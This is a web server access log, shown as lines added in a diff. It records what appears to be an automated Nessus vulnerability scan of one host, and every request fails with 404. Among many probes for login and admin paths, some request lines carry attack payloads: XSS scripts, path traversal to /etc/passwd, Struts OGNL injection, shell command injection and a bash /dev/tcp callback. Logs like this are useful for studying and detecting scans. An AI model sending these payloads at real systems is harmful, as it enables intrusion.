+INFO:     198.82.145.75:35492 - "GET /gui/i18n/messages.en.json HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35508 - "GET /system/console?version=1.5 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35510 - "GET /images/login_top.gif HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35522 - "GET /images/logon_merge.gif HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35528 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35538 - "GET /431cb5237001e73e794398e4fa3cf660/css/main-green.css HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35554 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35568 - "GET /f360/login.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35572 - "GET //login.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35574 - "GET /login/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35588 - "GET /features HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35604 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35608 - "GET //login/login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35620 - "GET /fpui/jsp/login.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35634 - "GET /acopia/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35650 - "GET /ui/login/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35664 - "GET /PUBLIC/ADMIN/INDEX.HTM HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35668 - "GET /SE/appInfo.xml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35676 - "GET /SE/EMC_SE.swf HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35684 - "GET /SE/EMC_SE.swf HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35694 - "GET /RSAarcher/Default.aspx HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35702 - "GET /RSAarcher/Default.asp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35712 - "GET /dtlt/home.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35718 - "GET /desktop/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35726 - "GET /user/login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35740 - "GET /probe/probeInfo HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35756 - "GET /syslog.htm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35764 - "GET /servlet/UDataArea?plugin=com.dell.oma.webplugins.AboutWebPlugin HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35768 - "GET /UDataArea?plugin=com.dell.oma.webplugins.AboutWebPlugin HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35778 - "GET /common/about.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35786 - "GET /about HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35794 - "GET /ddem/rest/auth/info HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35804 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35810 - "GET /devinfo?area=notice|net|version HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35818 - "GET /ayefeaturesconvert.js HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35830 - "GET /CVS/Entries HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35846 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35852 - "GET /rest-service/reviews-v1/versionInfo HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35862 - "GET /crossdomain.xml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35878 - "GET /13jc1398.asp?<script>document.cookie=%22testztcs=1642;%22</script> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35882 - "GET /13jc1398.asp?<meta%20http-equiv=Set-Cookie%20content=%22testztcs=1642%22> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35898 - "GET /13jc1398.aspx?<script>document.cookie=%22testztcs=1642;%22</script> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35908 - "GET /13jc1398.aspx?<meta%20http-equiv=Set-Cookie%20content=%22testztcs=1642%22> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35922 - "GET /13jc1398.pl?<script>document.cookie=%22testztcs=1642;%22</script> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35926 - "GET /13jc1398.pl?<meta%20http-equiv=Set-Cookie%20content=%22testztcs=1642%22> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35940 - "GET /13jc1398.cgi?<script>document.cookie=%22testztcs=1642;%22</script> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35956 - "GET /13jc1398.cgi?<meta%20http-equiv=Set-Cookie%20content=%22testztcs=1642%22> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35964 - "GET /13jc1398.exe?<script>document.cookie=%22testztcs=1642;%22</script> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35976 - "GET /13jc1398.exe?<meta%20http-equiv=Set-Cookie%20content=%22testztcs=1642%22> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35982 - "GET /13jc1398.cfm?<script>document.cookie=%22testztcs=1642;%22</script> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35984 - "GET /13jc1398.cfm?<meta%20http-equiv=Set-Cookie%20content=%22testztcs=1642%22> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35996 - "GET /13jc1398.html?<script>document.cookie=%22testztcs=1642;%22</script> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36010 - "GET /13jc1398.html?<meta%20http-equiv=Set-Cookie%20content=%22testztcs=1642%22> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36016 - "GET /13jc1398.jsp?<script>document.cookie=%22testztcs=1642;%22</script> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36022 - "GET /13jc1398.jsp?<meta%20http-equiv=Set-Cookie%20content=%22testztcs=1642%22> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36038 - "GET /13jc1398.php?<script>document.cookie=%22testztcs=1642;%22</script> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36040 - "GET /13jc1398.php?<meta%20http-equiv=Set-Cookie%20content=%22testztcs=1642%22> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36046 - "GET /13jc1398.php3?<script>document.cookie=%22testztcs=1642;%22</script> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36050 - "GET /13jc1398.php3?<meta%20http-equiv=Set-Cookie%20content=%22testztcs=1642%22> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36064 - "GET /13jc1398.cfc?<script>document.cookie=%22testztcs=1642;%22</script> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36072 - "GET /13jc1398.cfc?<meta%20http-equiv=Set-Cookie%20content=%22testztcs=1642%22> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36086 - "GET /13jc1398.nsf?<script>document.cookie=%22testztcs=1642;%22</script> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36092 - "GET /13jc1398.nsf?<meta%20http-equiv=Set-Cookie%20content=%22testztcs=1642%22> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36104 - "GET /13jc1398.dll?<script>document.cookie=%22testztcs=1642;%22</script> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36106 - "GET /13jc1398.dll?<meta%20http-equiv=Set-Cookie%20content=%22testztcs=1642%22> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36114 - "GET /13jc1398.fts?<script>document.cookie=%22testztcs=1642;%22</script> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36126 - "GET /13jc1398.fts?<meta%20http-equiv=Set-Cookie%20content=%22testztcs=1642%22> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36138 - "GET /13jc1398.jspa?<script>document.cookie=%22testztcs=1642;%22</script> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36150 - "GET /13jc1398.jspa?<meta%20http-equiv=Set-Cookie%20content=%22testztcs=1642%22> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36158 - "GET /13jc1398.kspx?<script>document.cookie=%22testztcs=1642;%22</script> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36170 - "GET /13jc1398.kspx?<meta%20http-equiv=Set-Cookie%20content=%22testztcs=1642%22> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36182 - "GET /13jc1398.mscgi?<script>document.cookie=%22testztcs=1642;%22</script> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36194 - "GET /13jc1398.mscgi?<meta%20http-equiv=Set-Cookie%20content=%22testztcs=1642%22> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36208 - "GET /13jc1398.do?<script>document.cookie=%22testztcs=1642;%22</script> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36222 - "GET /13jc1398.do?<meta%20http-equiv=Set-Cookie%20content=%22testztcs=1642%22> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36232 - "GET /13jc1398.htm?<script>document.cookie=%22testztcs=1642;%22</script> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36248 - "GET /13jc1398.htm?<meta%20http-equiv=Set-Cookie%20content=%22testztcs=1642%22> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36264 - "GET /13jc1398.idc?<script>document.cookie=%22testztcs=1642;%22</script> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36276 - "GET /13jc1398.idc?<meta%20http-equiv=Set-Cookie%20content=%22testztcs=1642%22> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36280 - "GET /13jc1398.x?<script>document.cookie=%22testztcs=1642;%22</script> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36290 - "GET /13jc1398.x?<meta%20http-equiv=Set-Cookie%20content=%22testztcs=1642%22> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36298 - "GET /%3Cscript%3Edocument.cookie%3D%22testztcs%3D1642%3B%22%3C/script%3E HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36300 - "GET %3Cscript%3Edocument.cookie%3D%22testztcs%3D1642%3B%22%3C/script%3E HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36306 - "GET /?<script>document.cookie=%22testztcs=1642;%22</script> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36314 - "GET /%3Cmeta%20http-equiv%3DSet-Cookie%20content%3D%22testztcs%3D1642%22%3E HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36318 - "GET %3Cmeta%20http-equiv%3DSet-Cookie%20content%3D%22testztcs%3D1642%22%3E HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36322 - "GET /?<meta%20http-equiv=Set-Cookie%20content=%22testztcs=1642%22> HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36324 - "GET /ConsoleHelp/default.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36338 - "GET /CFIDE/administrator/settings/version.cfm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36346 - "GET /cmf/login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36354 - "GET /clientaccesspolicy.xml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36356 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36370 - "GET /Director HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36378 - "GET /DesktopDirector HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36390 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36404 - "GET /client/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36406 - "GET /login?redirects=10 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36416 - "GET /ControllerWeb/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36418 - "GET /app/ui/login.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36428 - "GET /ui/faces/Login.xhtml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36436 - "GET /index.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36438 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36450 - "GET /system.xml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36464 - "GET /getxml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36480 - "GET /login?redirects=10 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36494 - "GET http%3A//128.173.237.13%3A5550/authentication/login/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36496 - "GET /login.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36512 - "GET /CSCOnm/servlet/login/login.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36518 - "GET /login.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36522 - "GET /login?redirects=10 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36530 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36540 - "GET /cacti HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36542 - "GET /MM/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36554 - "GET /login.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36560 - "GET /nosuchfile-1157251990-472025904.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36570 - "GET /webapps/login/index.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36578 - "GET /webct/about.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36586 - "GET /WS2020/Default.aspx HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36602 - "GET /WS2021/Default.aspx HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36604 - "GET /WS2022/Default.aspx HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36612 - "GET /WS2023/Default.aspx HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36626 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36628 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36642 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36658 - "GET /cgi-mod/index.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36672 - "GET /cgi-bin/index.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36684 - "GET /header.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36694 - "GET /.htaccess.old HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36696 - "GET /.htaccess.bak HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36706 - "GET /.htaccess~ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36720 - "GET /.htaccess.copy HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36730 - "GET /.htaccess.tmp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36736 - "GET /..htaccess.swp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36740 - "GET /.htaccess.1 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36748 - "GET /.htaccess.~1~ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36758 - "GET /snmx-cgi/fxm.exe HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:44880 - "GET /platform-ui/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:44890 - "GET /management/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:44900 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:44910 - "GET /server-info HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:44914 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:44916 - "GET /kylin/api/admin/version HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:44922 - "GET /unified-console.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:44926 - "GET /api/v1/?format=api HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:44938 - "GET /api/v1/?format=api HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:44946 - "GET /system/login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:44950 - "GET /system/login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:44960 - "GET /courier/web/1000%40/wmLogin.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:44964 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:44976 - "GET /servlet/admin?category=server&method=listAll&Authorization=Digest+username%3D%22admin%22%2C+response%3D%22ae9f86d6beaa3f9ecb9a5b7e072a4138%22%2C+nonce%3D%222b089ba7985a883ab2eddcd3539a6c94%22%2C+realm%3D%22adminRealm%22%2C+uri%3D%22%2Fservlet%2Fadmin%22&service= HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     198.82.145.75:44996 - "POST /cgi-bin/mainfunction.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:45008 - "GET /self_upgrade.html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     198.82.145.75:34670 - "GET /item.fts?href=%22%3E%3Cscript%3Ealert%28%22ftgate_44002.nasl%22%29%3C%2Fscript%3E%3B HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34684 - "GET /altercast/AlterCast?op=%3cscript%3ealert%28%22adobe_document_server_61.nasl%22%29%3c%2fscript%3e HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34690 - "GET /nul.dbm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34702 - "GET /mxhelp/cgi-bin/namazucgi?lang=/../../../../../../../../../../../../../boot.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34718 - "GET /index.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34732 - "GET /index.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34736 - "GET /web.config HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34738 - "GET /scripts/w3who.dll HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34740 - "GET /cgi-bin/filescan HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34754 - "GET /struts/webconsole.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34770 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34772 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34778 - "POST / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34788 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34790 - "GET /?class.classLoader.URLs[0]=struts_2_3_16_1_classloader_manipulation-1760982843 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34806 - "GET //%24%7B1735028906%2B5%7D.action HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34814 - "GET //%24%7B%23w%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29.getWriter%28%29%2C%23w.print%28%27Nessus%20Response%3A%20%27%29%2C%23w.println%28%27struts_2_3_14_3_command_execution-1735028906%27%29%2C%23w.flush%28%29%2C%23w.close%28%29%7D.action HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34818 - "GET //struts/webconsole.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34830 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34840 - "GET /.anydomain.test HTTP/1.0" 404 Not Found
+INFO:     198.82.145.75:34842 - "GET /etc/mnt_info.csv HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34846 - "POST /javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34860 - "GET /OvCgi/freeIPaddrs.ovpl?netnum=127.0.0.1&netmask=255.255.255.0&netid=127.0.0.1%20|%20id| HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34872 - "GET /setup/setup-/../../log.jsp?log=info&mode=asc&lines=10 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34888 - "GET /api/getServices?name[]=$(/bin/bash%20-c%20%22nslookup%20log4shell-generic-8XOHM3VumkxpFb3wIf1zten.w.nessus.org) HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34898 - "GET /api/getServices?name[]=$(bash%20-c%20%22echo%20exploited_port[5550]by_nessus%20%3E/dev/tcp/198.82.145.75/40691") HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34908 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35636 - "GET /version HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35640 - "GET /.%252e/.%252e/.%252e/.%252e/windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35652 - "GET /.%252e/.%252e/.%252e/.%252e/winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35656 - "GET /.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35662 - "GET /ifx/?LO=../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35678 - "GET /status.xsl. HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35686 - "POST /vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35688 - "POST /glpi/vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35704 - "POST /FormHandler.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35708 - "GET /cgi-bin/faqmanager.cgi?toc=/etc/passwd%00 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35712 - "POST http%3A//127.0.0.1/iControl/iControlPortal.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35714 - "GET /DB4Web/booberry.iso.vt.edu%3A23/foo HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35728 - "GET /CFIDE/administrator/index.cfm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35732 - "GET /backend/settings/oauth_adfs?hostname=128.173.237.13 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35748 - "GET /gui/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35760 - "GET /gui/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35766 - "GET /axis/DirectDownload.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35776 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35786 - "GET /_mt/mt.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35796 - "GET /admin.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35806 - "GET /administrator.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35818 - "GET /buglist.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35830 - "GET /cgi/mid.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35844 - "GET /cgi-bin/admin HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35850 - "GET /cgi-bin/admin.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35854 - "GET /cgi-bin/admin.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35864 - "GET /cgi-bin/administrator HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35866 - "GET /cgi-bin/administrator.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35868 - "GET /cgi-bin/agorn.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35876 - "GET /cgi-bin/bugreport.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35892 - "GET /cgi-bin/cart.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35906 - "GET /cgi-bin/clwarn.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35910 - "GET /cgi-bin/count.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35926 - "GET /cgi-bin/Count.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35942 - "GET /cgi-bin/faqmanager.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35956 - "GET /cgi-bin/FormHandler.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35972 - "GET /cgi-bin/FormMail.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35978 - "GET /cgi-bin/guestbook.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35980 - "GET /cgi-bin/help.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35984 - "GET /cgi-bin/hi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35998 - "GET /cgi-bin/index.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36000 - "GET /cgi-bin/index.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36016 - "GET /cgi-bin/index.sh HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36026 - "GET /cgi-bin/login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36034 - "GET /cgi-bin/login.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36050 - "GET /cgi-bin/mailit.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36052 - "GET /cgi-bin/mt/mt-check.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36066 - "GET /cgi-bin/mt/mt-load.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36080 - "GET /cgi-bin/mt-static/mt-check.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36082 - "GET /cgi-bin/mt-static/mt-load.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36086 - "GET /cgi-bin/ncbook/book.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36092 - "GET /cgi-bin/printenv HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36108 - "GET /cgi-bin/printenv.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36114 - "GET /cgi-bin/quickstore.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36116 - "GET /cgi-bin/search HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36128 - "GET /cgi-bin/search.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36142 - "GET /cgi-bin/search/search.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36156 - "GET /cgi-bin/status HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36170 - "GET /cgi-bin/status.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36174 - "GET /cgi-bin/test.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36184 - "GET /cgi-bin/test.sh HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36196 - "GET /cgi-bin/test-cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36200 - "GET /cgi-bin/upload.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36208 - "GET /cgi-bin/urlcount.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36212 - "GET /cgi-bin/viewcvs.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36226 - "GET /cgi-bin/wa HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36234 - "GET /cgi-bin/wa.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36240 - "GET /cgi-bin/wa.exe HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36246 - "GET /cgi-bin/whois.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36252 - "GET /cgi-bin-sdb/printenv HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36268 - "GET /cgi-mod/index.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36272 - "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36274 - "GET /cgi-sys/entropysearch.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36278 - "GET /index.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36292 - "GET /index.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36302 - "GET /index.sh HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36314 - "GET /nph-mr.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36320 - "GET /query.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36324 - "GET /session_login.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36338 - "GET /show_bug.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36354 - "GET /test HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36358 - "GET /test.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36368 - "GET /ucsm/isSamInstalled.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36380 - "GET /whois.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36386 - "GET /wp-login.php HTTP/1.1" 404 Not Found
